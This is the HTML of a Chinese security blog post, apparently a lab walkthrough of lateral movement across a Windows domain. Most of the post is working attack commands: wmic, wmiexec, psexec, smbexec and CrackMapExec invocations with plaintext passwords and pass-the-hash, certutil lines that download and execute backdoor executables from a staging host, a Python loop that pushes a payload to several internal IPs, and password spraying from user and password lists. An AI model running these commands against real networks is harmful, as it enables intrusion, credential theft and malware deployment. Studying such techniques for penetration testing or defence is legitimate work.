@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(二) 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(二)</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-09-29 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-二"><a href="#内网横向移动-二" class="headerlink" title="内网横向移动(二)"></a>内网横向移动(二)</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/82f7f61b/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/82f7f61b/image-20220929085713847.png" alt="image-20220929085713847"><br>和上篇环境相同已经拿到webserver权限并且提权</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>方法和上篇相同<br><img src="/posts/82f7f61b/image-20220929090156725.png" alt="image-20220929090156725"><br><img src="/posts/82f7f61b/image-20220929090206296.png" alt="image-20220929090206296"></p>
+<h2 id="域横向移动"><a href="#域横向移动" class="headerlink" title="域横向移动"></a>域横向移动</h2><p>先将木马上传到webserver的web目录(具体操作见上篇)<br><img src="/posts/82f7f61b/image-20220929092116112.png" alt="image-20220929092116112"></p>
+<h3 id="WMI-自带-amp-命令-amp-套件-amp-插件"><a href="#WMI-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="WMI-自带&amp;命令&amp;套件&amp;插件"></a>WMI-自带&amp;命令&amp;套件&amp;插件</h3><p>WMI是通过135端口进行利用，支持用户名明文的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
+<h4 id="1-wmic"><a href="#1-wmic" class="headerlink" title="1.wmic"></a>1.wmic</h4><p>内部：(单执行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe&quot;</span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create &quot;cmd.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行结束后并没有回显<br><img src="/posts/82f7f61b/image-20220929092535171.png" alt="image-20220929092535171"><br>但是确实已经执行成功<br><img src="/posts/82f7f61b/image-20220929092558693.png" alt="image-20220929092558693"></p>
+<h4 id="2-cscript"><a href="#2-cscript" class="headerlink" title="2.cscript"></a>2.cscript</h4><p>内置：(交互式)</p>
+<p>上传wmiexec.vbs(用webserver的web环境)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>
+
+<p>可以反弹shell但是在cs中不能操作 需要在本机shell环境执行<br><img src="/posts/82f7f61b/image-20220929093356049.png" alt="image-20220929093356049"></p>
+<h4 id="3-wmiexec-impacket"><a href="#3-wmiexec-impacket" class="headerlink" title="3.wmiexec-impacket"></a>3.wmiexec-impacket</h4><p>wmiexec为impacket套件中的工具<br>cs建立SOCKS代理 本机通过proxifier和内网环境进行通讯<br>执行命令:</p>
+<p>外部：(交互式&amp;单执行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">#hash</span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929094339457.png" alt="image-20220929094339457"><br><img src="/posts/82f7f61b/image-20220929095344270.png" alt="image-20220929095344270"></p>
+<p>下载后门：实际情况中要对账号(本地和域)和密码进行尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/mm.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929094721757.png" alt="image-20220929094721757"></p>
+<p>执行后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c c:/mm.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929094834259.png" alt="image-20220929094834259"><br>继续抓取hash和明文密码,进行横向移动</p>
+<h3 id="SMB-自带-amp-命令-amp-套件-amp-插件"><a href="#SMB-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="SMB-自带&amp;命令&amp;套件&amp;插件"></a>SMB-自带&amp;命令&amp;套件&amp;插件</h3><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。</p>
+<h4 id="1-psexec"><a href="#1-psexec" class="headerlink" title="1.psexec"></a>1.psexec</h4><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>内部：(交互式 windows官方工具) 依旧是返回一个shell需要在本机shell环境执行还需要管理员权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929100826849.png" alt="image-20220929100826849"></p>
+<p>外部：(交互式 外人开发的工具)<br>impacket套件windows版中工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929101711951.png" alt="image-20220929101711951"></p>
+<p>插件：<br>cs插件-psexec<br><img src="/posts/82f7f61b/image-20220929101836985.png" alt="image-20220929101836985"><br><img src="/posts/82f7f61b/image-20220929102108420.png" alt="image-20220929102108420"><br><img src="/posts/82f7f61b/image-20220929102122142.png" alt="image-20220929102122142"><br>sqlserver再次上线</p>
+<h4 id="2-smbexec-impacket"><a href="#2-smbexec-impacket" class="headerlink" title="2.smbexec-impacket"></a>2.smbexec-impacket</h4><p>外部：(交互式) .&#x2F;username为本地用户 god.&#x2F;username 为域用户 在实战中都要尝试(有可能域和本地密码相同，或内网本地密码统一)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</span><br><span class="line">smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929102928994.png" alt="image-20220929102928994"></p>
+<h4 id="3-services"><a href="#3-services" class="headerlink" title="3.services"></a>3.services</h4><p>内置：(单执行) –无回显</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe</span><br><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="工具-Proxychains-amp-CrackMapExec"><a href="#工具-Proxychains-amp-CrackMapExec" class="headerlink" title="工具-Proxychains&amp;CrackMapExec"></a>工具-Proxychains&amp;CrackMapExec</h3><h4 id="1、Windows-Proxifier-Python-exp"><a href="#1、Windows-Proxifier-Python-exp" class="headerlink" title="1、Windows+Proxifier+Python_exp"></a>1、Windows+Proxifier+Python_exp</h4><p>和上篇脚本类似</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>,<span class="string">&#x27;192.168.3.25&#x27;</span>,<span class="string">&#x27;192.168.3.29&#x27;</span>,<span class="string">&#x27;192.168.3.28&#x27;</span>,<span class="string">&#x27;192.168.3.30&#x27;</span>,<span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929105529414.png" alt="image-20220929105529414"><br><img src="/posts/82f7f61b/image-20220929105548450.png" alt="image-20220929105548450"><br>3.29和3.32下载成功<br><img src="/posts/82f7f61b/image-20220929110153239.png" alt="image-20220929110153239"><br>上线 抓取hash和明文密码<br><img src="/posts/82f7f61b/image-20220929110315051.png" alt="image-20220929110315051"><br>修改脚本改为hash传递</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929110701383.png" alt="image-20220929110701383"><br>域控也成功上线–抓取域控密码直接通杀</p>
+<h4 id="2、Linux-Proxychains-CrackMapExec"><a href="#2、Linux-Proxychains-CrackMapExec" class="headerlink" title="2、Linux+Proxychains+CrackMapExec"></a>2、Linux+Proxychains+CrackMapExec</h4><p>恢复到初始状态<br><img src="/posts/82f7f61b/image-20220929110947945.png" alt="image-20220929110947945"></p>
+<p>上述的脚本要不断去修改才能达到理想效果，利用下面的项目更加方便快捷<br><strong>CrackMapExec</strong><br>Github：<a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a target="_blank" rel="noopener" href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>按照官方手册提示进行安装</p>
+<p><strong>Linux Proxychains使用</strong><br>安装使用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53086690/article/details/121779832">https://blog.csdn.net/qq_53086690/article/details/121779832</a><br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install Proxychains4 #安装</span><br><span class="line">vim /etc/proxychains4.conf #编辑配置文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929191046187.png" alt="image-20220929191046187"></p>
+<p>密码喷射域登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929191740434.png" alt="image-20220929191740434"></p>
+<p>密码喷射本地登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929191837593.png" alt="image-20220929191837593"></p>
+<p>密码喷射本地登录命令执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;whoami&#x27; --local-aut</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929192122760.png" alt="image-20220929192122760"><br>密码喷射本地登录命令执行上线：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/82f7f61b/image-20220929192238867.png" alt="image-20220929192238867"><br>成功上线两台主机</p>
+<p>密码喷射域登录命令执行上线：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<p>密码喷射本地&amp;域登录命令执行全自动上线：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u user.txt -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br><span class="line"></span><br><span class="line">proxychains4 cme smb 192.168.3.21-32 -u Administrator -p Admin12345 -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure>
+
+<p>根据上线主机抓取密码然后写入字典进行测试<br><img src="/posts/82f7f61b/image-20220929212413728.png" alt="image-20220929212413728"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/2dc66d79/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-09-29 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E4%BA%8C"><span class="toc-text">内网横向移动(二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">域横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI-%E8%87%AA%E5%B8%A6-amp-%E5%91%BD%E4%BB%A4-amp-%E5%A5%97%E4%BB%B6-amp-%E6%8F%92%E4%BB%B6"><span class="toc-text">WMI-自带&amp;命令&amp;套件&amp;插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-wmic"><span class="toc-text">1.wmic</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cscript"><span class="toc-text">2.cscript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-wmiexec-impacket"><span class="toc-text">3.wmiexec-impacket</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E8%87%AA%E5%B8%A6-amp-%E5%91%BD%E4%BB%A4-amp-%E5%A5%97%E4%BB%B6-amp-%E6%8F%92%E4%BB%B6"><span class="toc-text">SMB-自带&amp;命令&amp;套件&amp;插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-psexec"><span class="toc-text">1.psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-smbexec-impacket"><span class="toc-text">2.smbexec-impacket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-services"><span class="toc-text">3.services</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7-Proxychains-amp-CrackMapExec"><span class="toc-text">工具-Proxychains&amp;CrackMapExec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81Windows-Proxifier-Python-exp"><span class="toc-text">1、Windows+Proxifier+Python_exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Linux-Proxychains-CrackMapExec"><span class="toc-text">2、Linux+Proxychains+CrackMapExec</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
